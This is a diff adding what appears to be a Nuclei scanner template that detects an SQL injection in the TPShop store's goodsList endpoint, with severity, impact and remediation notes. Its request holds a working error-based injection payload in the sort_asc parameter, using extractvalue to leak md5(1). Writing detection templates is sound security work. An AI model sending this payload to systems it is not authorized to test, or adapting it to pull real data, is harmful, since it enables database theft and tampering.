@@ -1,0 +1,24 @@
+id: tpshop-goodslist-sql-injection
+
+info:
+  name: TPShop 前端 goodsList 接口排序参数 SQL 注入漏洞
+  author: bl
+  severity: high
+  description: |
+    TPShop 商城系统前端 goodsList 接口存在 SQL 注入漏洞。由于 order/sort 参数过滤不严，攻击者可构造恶意 SQL 表达式并注入后端数据库执行，导致数据泄露或篡改。
+  impact: |
+    Successful exploitation allows attackers to execute arbitrary SQL queries, leading to sensitive data disclosure, authentication bypass, and potential full database compromise depending on database privileges.
+  remediation: |
+    Use parameterized queries and strict input validation for all sorting and ordering parameters. Avoid directly concatenating user input into SQL statements.
+  tags: TPSHOP
+  
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/Mobile/Goods/goodsList/id/1/sort_asc/desc,extractvalue(1,concat(0x7e,(select%20md5(1)),0x7e))"
+    matchers:
+      - type: word
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849"
+        part: body
+        condition: and
